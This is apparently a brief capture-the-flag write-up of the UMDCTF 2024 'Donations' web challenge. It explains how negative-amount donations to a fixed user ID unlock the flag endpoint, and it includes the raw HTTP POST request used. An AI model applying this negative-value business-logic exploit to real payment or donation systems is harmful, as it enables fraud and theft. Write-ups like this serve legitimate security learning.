---
title: "umdctf2024 - Donations"
date: 2024-04-28T18:57:47-03:00
draft: false
description: ""
tags: ["web", "umdctf"]
---


After downloading and prettifying the javascript code we see that there's a `/api/flag` and a `/api/donate` endpoints.

The flag route returns:

```json
{"detail":"only the wealthy may view the treasure..."}
```

After trying some things that didn't work, I went to the donate functionality.
Using the parameters that I found in the javascript I is playing with this funcionality and noticed that you can only donate to a specific user

```json
{"detail":"you may only donate to Jeff Bezos"}
```

And somehow that Jeff Bezos's id is `lisanalgaib`

The solution was to donate a negative amount and earn that in return.

```http
POST /api/donate HTTP/2
Host: donations-api.challs.umdctf.io
Content-Length: 30
Cookie: session=...
Content-Type: application/x-www-form-urlencoded

to=lisanalgaib&currency=-99999
```

